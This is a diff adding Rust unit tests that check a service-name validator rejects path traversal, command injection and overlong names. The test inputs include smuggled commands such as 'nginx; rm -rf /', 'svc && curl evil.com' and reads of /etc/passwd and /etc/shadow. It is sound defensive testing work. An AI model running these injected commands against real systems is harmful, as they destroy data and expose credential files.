@@ -123,4 +123,49 @@ mod tests {
         assert_eq!(result.status, "error");
         assert_eq!(result.error.unwrap().code, "INVALID_PARAMETERS");
     }
+
+    #[test]
+    fn test_path_traversal_blocked() {
+        assert!(!is_safe_service_name("../../../etc/passwd"));
+        assert!(!is_safe_service_name("/etc/shadow"));
+        assert!(!is_safe_service_name("service/../../root"));
+    }
+
+    #[test]
+    fn test_command_injection_blocked() {
+        assert!(!is_safe_service_name("nginx; rm -rf /"));
+        assert!(!is_safe_service_name("svc && curl evil.com"));
+        assert!(!is_safe_service_name("svc | cat /etc/passwd"));
+        assert!(!is_safe_service_name("$(whoami)"));
+        assert!(!is_safe_service_name("`id`"));
+    }
+
+    #[test]
+    fn test_long_service_name_rejected() {
+        let long_name = "a".repeat(257);
+        assert!(!is_safe_service_name(&long_name));
+        // 256 chars is the limit
+        let max_name = "a".repeat(256);
+        assert!(is_safe_service_name(&max_name));
+    }
+
+    #[test]
+    fn test_service_handler_command_types() {
+        let handler = ServiceHandler;
+        let types = handler.command_types();
+        assert!(types.contains(&"service_status"));
+        assert!(types.contains(&"service_start"));
+        assert!(types.contains(&"service_stop"));
+        assert!(types.contains(&"service_restart"));
+        assert_eq!(types.len(), 4);
+    }
+
+    #[tokio::test]
+    async fn test_invalid_service_name_rejected() {
+        let handler = ServiceHandler;
+        let params = serde_json::json!({"service": "nginx; rm -rf /"});
+        let result = handler.execute("service_status", Some(&params)).await;
+        assert_eq!(result.status, "error");
+        assert_eq!(result.error.unwrap().code, "INVALID_PARAMETERS");
+    }
 }
